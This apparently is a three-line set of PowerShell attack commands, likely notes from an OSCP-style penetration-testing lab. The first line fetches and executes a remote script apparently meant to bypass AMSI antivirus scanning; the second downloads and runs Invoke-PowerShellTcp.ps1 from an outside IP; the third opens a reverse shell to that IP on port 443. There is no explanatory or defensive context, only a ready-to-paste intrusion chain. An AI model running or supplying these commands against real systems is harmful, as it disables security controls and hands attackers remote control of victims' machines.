IEX (iwr http://175.12.80.10/oscp/amsi.txt -UseBasicParsing)
IEX(New-Object System.Net.WebClient).DownloadString('http://175.12.80.10/oscp/Invoke-PowerShellTcp.ps1')
Invoke-PowerShellTcp -Reverse -IPAddress 175.12.80.10  -Port 443
